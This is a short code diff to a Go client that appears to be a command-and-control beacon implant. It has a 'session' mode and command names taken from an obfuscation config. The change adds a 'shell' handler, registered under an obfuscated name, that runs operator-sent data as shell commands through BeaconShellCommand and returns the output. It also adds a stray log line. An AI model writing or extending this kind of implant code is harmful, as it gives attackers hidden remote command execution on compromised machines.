@@ -7,6 +7,7 @@ import (
 	"strings"
 
 	httpFuncs "src/Client/beacon/http"
+	"src/Client/generic/commands"
 	"src/Client/generic/config"
 	"src/Client/generic/logger"
 	"src/Client/generic/rpc_client"
@@ -29,6 +30,15 @@ func init() {
 	handlers["session"] = func(cmd httpFuncs.CommandData, data string) (string, bool) {
 		logger.Log("switching to 'session' mode")
 		return "ack", true
+	}
+	handlers[config.Obfuscation.Generic.Commands.Shell.Name] = func(cmd httpFuncs.CommandData, data string) (string, bool) {
+		logger.Log("Processing 'shell' command.")
+		commands, err := commands.BeaconShellCommand(data)
+		if err != nil {
+			logger.Error(fmt.Sprintf("Failed to process 'shell' command: %v", err))
+			return "Error: Failed to process 'shell' command: " + err.Error(), false
+		}
+		return commands, false
 	}
 	handlers["update"] = func(cmd httpFuncs.CommandData, data string) (string, bool) {
 		logger.Log("Processing 'update' command.")
@@ -88,6 +98,7 @@ func executeCommand(command httpFuncs.CommandData) (httpFuncs.CommandReport, boo
 			outputMsg = fmt.Sprintf("Error executing %s: %v", command.Command, err)
 		}
 	} else {
+		logger.Log(fmt.Sprintf("list of handlers"))
 		logger.Log(fmt.Sprintf("Processing generic command: '%s'", command.Command))
 		outputMsg = handleGenericCommand(command)
 	}
